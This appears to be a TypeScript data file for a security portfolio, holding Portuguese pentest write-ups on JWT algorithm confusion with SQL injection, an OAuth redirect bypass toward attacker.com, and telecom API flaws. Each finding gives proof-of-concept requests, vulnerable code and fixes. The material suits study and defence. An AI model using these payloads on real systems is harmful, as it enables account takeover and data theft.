export interface Finding {
  id: string;
  title: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  cvss: number;
  cvssVector?: string;
  cwe: string;
  impact: string;
  description: string;
  vulnerabilities: string[];
  pocSteps: string[];
  pocRequest: string;
  pocResponse: string;
  vulnCode: string;
  secureCode: string;
  vulnerableEndpoint?: string;
  references?: string[];
  alternativeMitigation?: string;
}

export interface SecurityReport {
  id: string;
  title: string;
  category: "Mundo Real" | "Estudos & Certificações" | "Custom Labs";
  badge: string;
  description: string;
  findings: Finding[];
  targetStack?: string[];
  status?: string;
  githubUrl?: string;
}

export const reports: SecurityReport[] = [
  {
    id: "jwt-sqli",
    title: "JWT Algorithm Confusion to SQLite Injection",
    category: "Estudos & Certificações",
    badge: "PortSwigger",
    description: "Bypass de assinatura de JWT manipulando o header alg para HS256 com chave pública simétrica, explorando SQL Injection no campo claim 'sub' para extrair credenciais.",
    targetStack: ["Express", "SQLite", "JSONWebToken"],
    findings: [
      {
        id: "jwt-sqli-finding",
        title: "AlgConfusion & SQLi no claim 'sub'",
        severity: "CRITICAL",
        cvss: 9.8,
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        vulnerableEndpoint: "GET /api/users/profile (Header: Authorization)",
        cwe: "CWE-89 & CWE-347",
        impact: "Comprometimento total da confidencialidade do banco de dados, permitindo a extração de hashes de senhas administrativas e o sequestro completo de sessões de qualquer usuário.",
        description: "Bypass de assinatura de JWT manipulando o header alg para HS256 com chave pública simétrica, explorando SQL Injection no campo claim 'sub' para extrair credenciais.",
        vulnerabilities: ["Broken Authentication (JWT)", "SQL Injection (UNION-based)"],
        pocSteps: [
          "Obter a chave pública RSA exposta no endpoint '/api/keys'.",
          "Forjar um token JWT alterando o algoritmo no header de RS256 para HS256.",
          "No payload do token, injetar a query SQLi no claim 'sub' (ex: 1' UNION SELECT null, username, password FROM users --).",
          "Assinar simetricamente o token usando a chave pública obtida como segredo HMAC.",
          "Enviar a requisição GET para '/api/users/profile' contendo o token no cabeçalho Authorization: Bearer <payload>."
        ],
        pocRequest: `GET /api/users/profile HTTP/1.1\nHost: vulnerable-lab.local\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxJyBVTklPTiBTRUxFQ1QgbnVsbCwgdXNlcm5hbWUsIHBhc3N3b3JkIEZST00gdXNlcnMgLS0iLCJpYXQiOjE1MTYyMzkwMjJ9.signature_hash\nAccept: application/json`,
        pocResponse: `HTTP/1.1 200 OK\nContent-Type: application/json\nConnection: close\n\n{\n  "id": "1' UNION SELECT null, username, password FROM users --",\n  "username": "admin",\n  "email": "$2b$12$K7vJ2yS5Uv9zL8x2yQv7uO0nK3xR5VvY7pL8z9x2yQv7uO0nK3xR5"\n}`,
        vulnCode: `// VULNERABILIDADE: Aceita algoritmo do token sem validação estrita\nconst jwt = require('jsonwebtoken');\nconst publicKey = fs.readFileSync('public.key');\n\napp.get('/api/users/profile', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  \n  // A biblioteca verifica usando a chave pública, mas aceita HS256 assinado com ela\n  const decoded = jwt.verify(token, publicKey); \n  \n  // SQL Injection direto por concatenação do claim 'sub'\n  const sql = "SELECT * FROM users WHERE id = '" + decoded.sub + "'";\n  db.get(sql, [], (err, row) => {\n    res.json(row);\n  });\n});`,
        secureCode: `// CORREÇÃO: Forçar algoritmo de verificação e usar queries parametrizadas\nconst jwt = require('jsonwebtoken');\nconst publicKey = fs.readFileSync('public.key');\n\napp.get('/api/users/profile', (req, res) => {\n  try {\n    const token = req.headers.authorization.split(' ')[1];\n    \n    // Força a validação usando apenas o algoritmo assimétrico esperado\n    const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });\n    \n    // Consulta parametrizada segura contra injeção SQL\n    const sql = "SELECT id, username, email FROM users WHERE id = ?";\n    db.get(sql, [decoded.sub], (err, row) => {\n      if (err) return res.status(500).json({ error: err.message });\n      res.json(row);\n    });\n  } catch (err) {\n    res.status(401).json({ error: "Token inválido ou expirado" });\n  }\n});`,
        references: [
          "https://portswigger.net/web-security/jwt/algorithm-confusion",
          "https://owasp.org/www-community/attacks/SQL_Injection"
        ],
        alternativeMitigation: "WAF Rule (ModSecurity): Criar regra para inspecionar parâmetros JSON e cabeçalhos HTTP, bloqueando requisições contendo padrões clássicos de SQL Injection (como UNION SELECT). Alternativamente, no API Gateway, rejeitar tokens JWT cuja propriedade 'alg' no header esteja configurada como 'HS256' caso o serviço utilize chaves assimétricas."
      }
    ]
  },
  {
    id: "oauth-takeover",
    title: "Federated OAuth & JWT Identity Takeover",
    category: "Estudos & Certificações",
    badge: "PortSwigger",
    description: "Exploração de Open Redirect em regex vulnerável no redirect_uri de login federado para sequestro de Authorization Codes e forjamento de JWTs usando cabeçalho 'jku'.",
    targetStack: ["Express", "OAuth 2.0", "JWKS"],
    findings: [
      {
        id: "oauth-takeover-finding",
        title: "Bypass de Redirect e Hijack de Código",
        severity: "HIGH",
        cvss: 8.5,
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
        vulnerableEndpoint: "GET /api/auth/oauth/authorize (Query: redirect_uri)",
        cwe: "CWE-601 & CWE-347",
        impact: "Sequestro completo de contas de usuários legítimos que utilizam o Single Sign-On (SSO) do portal, permitindo login administrativo e bypass de autenticação federada.",
        description: "Exploração de Open Redirect em regex vulnerável no redirect_uri de login federado para sequestro de Authorization Codes e forjamento de JWTs usando cabeçalho 'jku'.",
        vulnerabilities: ["Broken Authentication", "Open Redirect", "Insecure OAuth Flows"],
        pocSteps: [
          "Identificar o fluxo OAuth '/api/auth/oauth/authorize?redirect_uri=...'.",
          "Bypassar a validação da regex de redirect_uri fornecendo um redirecionamento malicioso (ex: https://trusted-client.com/callback/../../attacker.com).",
          "Capturar o código de autenticação enviado pelo Identity Provider no servidor controlado pelo atacante.",
          "Criar e assinar um token JWT com as claims falsificadas e apontar o cabeçalho 'jku' para as chaves públicas JWKS controladas pelo atacante.",
          "Autenticar-se no sistema alvo com identidade adulterada de administrador."
        ],
        pocRequest: `GET /api/auth/oauth/authorize?client_id=crm_app&redirect_uri=https://trusted-client.com/callback/../../attacker.com/steal&response_type=code HTTP/1.1\nHost: identity-provider.local\nCookie: session=valid_user_session`,
        pocResponse: `HTTP/1.1 302 Found\nLocation: https://attacker.com/steal?code=AUTH_CODE_SEQUESTRADO\nConnection: close`,
        vulnCode: `// VULNERABILIDADE: Validação fraca da URI de redirecionamento via regex imperfeita\napp.get('/api/auth/oauth/authorize', (req, res) => {\n  const { redirect_uri } = req.query;\n  \n  // A regex apenas verifica se a URI contém o domínio, mas não valida caminhos relativos\n  if (!redirect_uri.match(/https:\\/\\/trusted-client\\.com/)) {\n    return res.status(400).send("Invalid Redirect URI");\n  }\n  \n  res.redirect(redirect_uri + "?code=" + generateCode());\n});`,
        secureCode: `// CORREÇÃO: Validação estrita contra uma whitelist de URIs exatas\nconst ALLOWED_REDIRECT_URIS = [\n  "https://trusted-client.com/callback",\n  "https://trusted-client.com/oauth-callback"\n];\n\napp.get('/api/auth/oauth/authorize', (req, res) => {\n  const { redirect_uri } = req.query;\n  \n  // Compara com a lista de URIs exatas permitidas\n  if (!ALLOWED_REDIRECT_URIS.includes(redirect_uri)) {\n    return res.status(400).send("Invalid Redirect URI");\n  }\n  \n  res.redirect(redirect_uri + "?code=" + generateCode());\n});`,
        references: [
          "https://portswigger.net/web-security/oauth",
          "https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"
        ],
        alternativeMitigation: "WAF / API Gateway: Implementar controle de acesso baseado em assinatura (Regex) no API Gateway para auditar o parâmetro 'redirect_uri', bloqueando caracteres de travessia como '/../' ou '%2f..%2f'. Além disso, configurar o cabeçalho Content-Security-Policy (CSP) para limitar as origens de redirecionamento de frame/janelas."
      }
    ]
  },
  {
    id: "telecom-audit",
    title: "Security Assessment: API de Telecomunicações (Anônimo)",
    category: "Mundo Real",
    badge: "Pentest",
    description: "Avaliação de segurança de caixa-preta (Black Box) realizada nas APIs públicas de provisionamento, portabilidade de chips e consulta cadastral de uma operadora.",
    findings: [
      {
        id: "telecom-idor",
        title: "BOLA/IDOR na Rota de Faturas",
        severity: "HIGH",
        cvss: 7.5,
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        vulnerableEndpoint: "GET /api/v1/billing/invoice/:invoice_id",
        cwe: "CWE-639",
        impact: "Vazamento em massa de dados cadastrais, históricos de consumo e informações confidenciais de faturamento de milhões de assinantes através do incremento sequencial simples de parâmetros.",
        description: "Falha de controle de acesso permitindo que qualquer usuário autenticado acesse faturas em formato PDF de qualquer outro cliente, modificando o ID numérico da fatura na URL.",
        vulnerabilities: ["Broken Object Level Authorization (BOLA)", "IDOR"],
        pocSteps: [
          "Efetuar login na conta de testes e clicar para visualizar a fatura do mês atual.",
          "Verificar que a API requisita '/api/v1/billing/invoice/10042'.",
          "Modificar o ID final na URL para qualquer outro número sequencial (ex: 10041, 10040).",
          "A API responde com o PDF da fatura do outro cliente sem validar se o token de sessão é proprietário do recurso."
        ],
        pocRequest: `GET /api/v1/billing/invoice/10041 HTTP/1.1\nHost: api.telecom-corp.local\nAuthorization: Bearer client_session_token`,
        pocResponse: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "invoice_id": 10041,\n  "customer_name": "João da Silva",\n  "billing_cycle": "06/2026",\n  "amount_due": 129.90,\n  "document_url": "https://telecom-s3-private.local/invoices/2026/06/10041.pdf"\n}`,
        vulnCode: `// VULNERABILIDADE: Confia no ID recebido na URL sem validar dono da sessão\napp.get('/api/v1/billing/invoice/:invoice_id', (req, res) => {\n  const invoiceId = req.params.invoice_id;\n  \n  db.get('SELECT * FROM invoices WHERE id = ?', [invoiceId], (err, row) => {\n    if (!row) return res.status(404).send("Invoice not found");\n    res.json(row);\n  });\n});`,
        secureCode: `// CORREÇÃO: Validar a propriedade do recurso através do ID do usuário na sessão\napp.get('/api/v1/billing/invoice/:invoice_id', (req, res) => {\n  const invoiceId = req.params.invoice_id;\n  const customerId = req.user.id; // Extraído com segurança do token JWT\n  \n  db.get(\n    'SELECT * FROM invoices WHERE id = ? AND customer_id = ?',\n    [invoiceId, customerId],\n    (err, row) => {\n      if (err) return res.status(500).json({ error: err.message });\n      if (!row) return res.status(403).json({ error: "Acesso não autorizado a esta fatura" });\n      res.json(row);\n    }\n  );\n});`,
        references: [
          "https://owasp.org/API-security/editions/2023/en/0x11-api1-broken-object-level-authorization/"
        ],
        alternativeMitigation: "WAF / API Gateway: Implementar controle de acesso temporário via Gateway (se o microsserviço legado não puder ser atualizado) validando a correspondência entre claims do JWT e os padrões de rotas acessadas."
      },
      {
        id: "telecom-ratelimit",
        title: "Bypass de Rate Limit no Gateway de SMS",
        severity: "MEDIUM",
        cvss: 5.3,
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
        vulnerableEndpoint: "POST /api/v1/otp/send",
        cwe: "CWE-307",
        impact: "Esgotamento de fundos da operadora por abuso do gateway de SMS pago, ataques de negação de serviço de telefonia (SMS Flooding) e fadiga de login em dispositivos de usuários.",
        description: "Bypass de limitação de requisições de SMS injetando cabeçalhos de controle de proxy (como X-Forwarded-For) ou adicionando caracteres nulos/espaços no número de telefone para evitar colisão na chave de limite do Redis.",
        vulnerabilities: ["Rate Limit Bypass", "Improper Input Validation"],
        pocSteps: [
          "Disparar repetidas requisições de envio de OTP para '/api/v1/otp/send' para um mesmo número.",
          "Ao receber '429 Too Many Requests', rotacionar aleatoriamente o valor do cabeçalho 'X-Forwarded-For: <ip_aleatorio>' ou adicionar espaços ao número de telefone (ex: '+5511999999999 ' com espaço extra).",
          "O middleware de rate limit falha em normalizar a entrada ou confia cegamente no IP do cabeçalho de proxy, enviando o SMS com sucesso repetidas vezes."
        ],
        pocRequest: `POST /api/v1/otp/send HTTP/1.1\nHost: api.telecom-corp.local\nX-Forwarded-For: 184.22.109.12\nContent-Type: application/json\n\n{\n  "phone": "+5511999999999 "\n}`,
        pocResponse: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "status": "sent",\n  "message": "Código de verificação enviado por SMS."\n}`,
        vulnCode: `// VULNERABILIDADE: Confia no X-Forwarded-For bruto e não sanitiza o número de telefone\nconst rateLimit = require('express-rate-limit');\n\nconst limiter = rateLimit({\n  windowMs: 60 * 1000,\n  max: 3,\n  keyGenerator: (req) => {\n    // Confia no IP enviado pelo cabeçalho (facilmente forjado)\n    return req.headers['x-forwarded-for'] || req.ip;\n  }\n});\napp.post('/api/v1/otp/send', limiter, (req, res) => {\n  // Envia o SMS\n});`,
        secureCode: `// CORREÇÃO: Confiar apenas no proxy reverso configurado (trust proxy) e normalizar entradas\nconst rateLimit = require('express-rate-limit');\n\n// 1. Configurar o Express para confiar no número correto de hops do proxy do Cloudflare/AWS\napp.set('trust proxy', 1);\n\nconst limiter = rateLimit({\n  windowMs: 60 * 1000,\n  max: 3,\n  keyGenerator: (req) => {\n    // Express preenche req.ip automaticamente com o IP do cliente real com base no trust proxy\n    // Também incluímos o número de telefone normalizado na chave limite\n    const rawPhone = req.body.phone || '';\n    const cleanPhone = rawPhone.trim().replace(/[^0-9+]/g, '');\n    return \`\${req.ip}_\${cleanPhone}\`;\n  }\n});\n\napp.post('/api/v1/otp/send', limiter, (req, res) => {\n  // Envia o SMS com segurança\n});`,
        references: [
          "https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks"
        ],
        alternativeMitigation: "API Gateway: Configurar regras globais de Rate Limiting no Cloudflare baseadas em impressões digitais de conexões TLS (JA3) e cookies de sessão, descartando cabeçalhos de controle de proxy originados da internet pública."
      },
      {
        id: "telecom-graphql",
        title: "Introspecção de GraphQL Habilitada em Produção",
        severity: "LOW",
        cvss: 5.3,
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        vulnerableEndpoint: "POST /api/v1/graphql",
        cwe: "CWE-200",
        impact: "Vazamento de toda a estrutura lógica do banco de dados, mapeamento de queries/mutations e objetos privados de negócios, facilitando a identificação de novos pontos de ataque na API.",
        description: "Habilitação da funcionalidade de introspecção no endpoint de produção GraphQL, permitindo a extração de toda a estrutura lógica da aplicação.",
        vulnerabilities: ["Information Disclosure", "Improper GraphQL Configuration"],
        pocSteps: [
          "Disparar uma requisição HTTP POST para o endpoint '/api/v1/graphql'.",
          "Passar a query de introspecção contendo a instrução '__schema'.",
          "O servidor retorna o JSON completo contendo a árvore de tipos, mutações e consultas disponíveis na API."
        ],
        pocRequest: `POST /api/v1/graphql HTTP/1.1\nHost: api.telecom-corp.local\nContent-Type: application/json\n\n{\n  "query": "{ __schema { queryType { name } } }"\n}`,
        pocResponse: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "data": {\n    "__schema": {\n      "queryType": {\n        "name": "Query"\n      }\n    }\n  }\n}`,
        vulnCode: `// VULNERABILIDADE: Inicializa o Apollo Server sem desativar a introspecção\nconst { ApolloServer } = require('apollo-server-express');\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  // Introspecção habilitada por padrão ou configurada como true explicitamente\n  introspection: true,\n  playground: true\n});`,
        secureCode: `// CORREÇÃO: Desativar introspecção e playground de GraphQL no ambiente de produção\nconst { ApolloServer } = require('apollo-server-express');\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  // Desativa explicitamente para ambientes que não sejam de desenvolvimento\n  introspection: process.env.NODE_ENV === 'development',\n  playground: process.env.NODE_ENV === 'development'\n});`,
        references: [
          "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL"
        ],
        alternativeMitigation: "API Gateway: Bloquear tráfego de requisições POST para a rota GraphQL que contenham strings de introspecção como '__schema' ou '__type' no body."
      },
      {
        id: "telecom-jwtleak",
        title: "Vazamento de Chave Privada JWT no GitHub",
        severity: "CRITICAL",
        cvss: 9.8,
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        vulnerableEndpoint: "Repositório Público do GitHub (vulnerable-telecom-repo)",
        cwe: "CWE-798",
        impact: "Comprometimento completo de toda a autenticação do sistema. Qualquer pessoa na internet pode criar tokens administrativos arbitrários e acessar contas de qualquer cliente e do painel de administração da operadora.",
        description: "Publicação acidental da chave privada de assinatura PEM utilizada no algoritmo RS256 dos tokens de autenticação da plataforma corporativa em um repositório público do GitHub.",
        vulnerabilities: ["Hardcoded Credentials", "Key Leakage"],
        pocSteps: [
          "OSINT: Realizar busca no GitHub sob a organização da operadora.",
          "Localizar repositório público esquecido contendo arquivos de configuração legados.",
          "Acessar o arquivo 'keys/private.key' e obter a chave privada PEM de assinatura.",
          "Criar um JWT assinado localmente com 'role: admin' e autenticar-se com privilégios completos no portal."
        ],
        pocRequest: `GET /api/v1/admin/dashboard HTTP/1.1\nHost: api.telecom-corp.local\nAuthorization: Bearer <token_falsificado_com_chave_vazada>`,
        pocResponse: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "admin_access": true,\n  "system_status": "fully_compromised"\n}`,
        vulnCode: `// VULNERABILIDADE: Carrega a chave privada commitada no repositório\nconst fs = require('fs');\nconst jwt = require('jsonwebtoken');\n\nconst privateKey = fs.readFileSync('./keys/private.key');\nconst token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'RS256' });`,
        secureCode: `// CORREÇÃO: Carregar chaves a partir de variáveis de ambiente/Secrets Manager externos\nconst jwt = require('jsonwebtoken');\n\nconst privateKey = process.env.JWT_PRIVATE_KEY;\nif (!privateKey) throw new Error("Chave não configurada!");\nconst token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'RS256' });`,
        references: [
          "https://owasp.org/www-community/Source_Code_Analysis_Tools"
        ],
        alternativeMitigation: "DevSecOps: Revogar imediatamente a chave vazada, rotacionar chaves e configurar GitGuardian/GitHub Secret Scanning no CI/CD."
      }
    ]
  }
];
